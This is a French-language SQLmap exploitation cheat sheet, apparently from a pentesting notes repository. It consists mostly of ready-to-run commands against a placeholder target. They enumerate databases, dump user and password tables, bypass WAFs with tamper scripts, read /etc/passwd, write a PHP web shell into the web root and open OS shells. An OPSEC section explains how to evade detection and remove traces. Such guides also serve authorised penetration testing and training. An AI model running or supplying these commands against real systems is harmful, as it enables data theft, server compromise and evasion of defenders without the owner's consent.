# SQLmap - Guide Complet d'Exploitation

## üóÇÔ∏è Workflow d'utilisation SQLmap
1. D√©tection initiale de l'injection (param√®tre vuln√©rable)
   ‚Üì
2. √ânum√©ration des bases de donn√©es disponibles
   ‚Üì
3. Exploration de la structure (tables, colonnes)
   ‚Üì
4. Extraction des donn√©es sensibles
   ‚Üì
5. Tentatives d'√©l√©vation de privil√®ges
   ‚Üì
6. Post-exploitation via SQL injection

## üìã Vue d'ensemble

SQLmap est l'outil de r√©f√©rence pour l'exploitation automatis√©e des injections SQL. Il d√©tecte, exploite et extrait des donn√©es via des vuln√©rabilit√©s SQL injection.

> **üí° Explication Simple** : C'est comme avoir un traducteur automatique qui convertit vos questions en langage que la base de donn√©es comprend, m√™me quand elle n'est pas cens√©e vous r√©pondre.

## ‚ö° Commandes Essentielles

### D√©tection et tests basiques
```bash
# Test basique sur param√®tre GET
sqlmap -u "http://target.com/page?id=1"

# Test avec donn√©es POST
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Test avec cookies
sqlmap -u "http://target.com/page" --cookie="SESSIONID=abc123"

# Test avec headers personnalis√©s
sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 1.1.1.1"
```

### √ânum√©ration des bases de donn√©es
```bash
# Lister toutes les bases
sqlmap -u "http://target.com/page?id=1" --dbs

# Informations syst√®me
sqlmap -u "http://target.com/page?id=1" --banner
sqlmap -u "http://target.com/page?id=1" --current-user
sqlmap -u "http://target.com/page?id=1" --current-db

# Privil√®ges utilisateur
sqlmap -u "http://target.com/page?id=1" --privileges
```

### Exploration de structure
```bash
# Tables d'une base sp√©cifique
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Colonnes d'une table
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns

# Schema complet
sqlmap -u "http://target.com/page?id=1" -D database_name --schema
```

### Extraction de donn√©es
```bash
# Dump d'une table compl√®te
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Colonnes sp√©cifiques
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C "username,password" --dump

# Avec conditions WHERE
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --where="username='admin'" --dump
```

## üéØ Techniques Avanc√©es

### Bypass de WAF et filtres
```bash
# Tamper scripts pour WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=charencode,randomcase

# Multiples tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=between,charencode,charunicodeencode

# D√©lais et threads
sqlmap -u "http://target.com/page?id=1" --delay=3 --threads=1
```

### Techniques d'injection sp√©cifiques
```bash
# Union-based seulement
sqlmap -u "http://target.com/page?id=1" --technique=U

# Boolean-based blind
sqlmap -u "http://target.com/page?id=1" --technique=B

# Time-based blind
sqlmap -u "http://target.com/page?id=1" --technique=T

# Error-based
sqlmap -u "http://target.com/page?id=1" --technique=E

# Stacked queries
sqlmap -u "http://target.com/page?id=1" --technique=S
```

### Tests avec authentification
```bash
# HTTP Basic Auth
sqlmap -u "http://target.com/page?id=1" --auth-type=basic --auth-cred="user:password"

# Formulaire de login
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --auth-type=digest

# Session cookies
sqlmap -u "http://target.com/page?id=1" --cookie="SESSIONID=abc123; auth=token"
```

## üîÑ Automatisation et Scripts

### Configuration batch
```bash
# Mode batch (pas d'interaction)
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# Niveau de risk et verbosit√©
sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5

# Sauvegarde de session
sqlmap -u "http://target.com/page?id=1" --save=config.conf
sqlmap --load=config.conf
```

### Tests sur fichiers de requ√™tes
```bash
# Depuis Burp Suite request
sqlmap -r request.txt

# Avec param√®tre sp√©cifique √† tester
sqlmap -r request.txt -p "vulnerable_param"

# Ignorer certains param√®tres
sqlmap -r request.txt --skip="csrf_token,timestamp"
```

### Scripts de post-exploitation
```bash
# Lecture de fichiers syst√®me
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# √âcriture de fichiers
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Shell interactif
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

## üõ†Ô∏è Configuration Avanc√©e

### Fichier de configuration personnalis√©
```ini
# sqlmap.conf
[Target]
url = http://target.com/page?id=1
cookie = SESSIONID=abc123

[Request]
user-agent = Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
delay = 2
timeout = 30
retries = 3

[Optimization]
threads = 5
predict-output = True
keep-alive = True

[Injection]
technique = BEUST
risk = 2
level = 3

[Detection]
text-only = True
titles = True
```

### Tamper scripts personnalis√©s
```python
# custom_tamper.py
def tamper(payload, **kwargs):
    """
    Tamper script personnalis√©
    """
    # Encodage personnalis√©
    retVal = payload
    if payload:
        retVal = payload.replace(' ', '/**/')
        retVal = retVal.replace('=', ' like ')
    
    return retVal
```

## üìä Analyse et Reporting

### Formats de sortie
```bash
# CSV export
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump --csv

# Sauvegarde dans fichier
sqlmap -u "http://target.com/page?id=1" --dbs --output-dir=./results

# Format XML
sqlmap -u "http://target.com/page?id=1" --dump --xml=results.xml
```

### Logs et debugging
```bash
# Verbosit√© maximale
sqlmap -u "http://target.com/page?id=1" -v 6

# Log dans fichier
sqlmap -u "http://target.com/page?id=1" --log-file=sqlmap.log

# Trace des requ√™tes HTTP
sqlmap -u "http://target.com/page?id=1" --traffic-file=http_traffic.log
```

## üõ°Ô∏è Conseils OPSEC
- Utiliser des d√©lais entre requ√™tes pour √©viter la d√©tection (--delay)
- Varier les User-Agents avec des scripts tamper
- Utiliser des proxies pour masquer l'origine (--proxy)
- Limiter le nombre de threads pour ne pas surcharger la cible
- Nettoyer les fichiers cr√©√©s apr√®s exploitation

## ‚ö†Ô∏è Erreurs fr√©quentes
- Oublier de tester tous les param√®tres (GET, POST, headers, cookies)
- Utiliser des niveaux de risk trop √©lev√©s sur des syst√®mes de production
- Ignorer les WAF et ne pas utiliser de tamper scripts appropri√©s
- Ne pas sauvegarder les sessions pour reprendre les tests
- Lancer des extractions compl√®tes sans autorisation

## üí° Astuces
- Commencer par --batch --risk=1 --level=1 pour tests rapides
- Utiliser -r avec fichiers Burp pour tests pr√©cis
- Combiner plusieurs tamper scripts pour bypass WAF complexes
- Utiliser --threads=1 --delay=3 pour tests discrets
- Sauvegarder toujours les sessions avec --save pour reprise

## üîó Pour aller plus loin
- [SQLmap Documentation](https://sqlmap.org/)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

## üß≠ Navigation
- [Guide SQL Injection](../Applications/SQL_Injection.md)
- [Guide Burp Suite](./Burp-Suite.md)
- [Retour aux outils d'exploitation](./README.md) 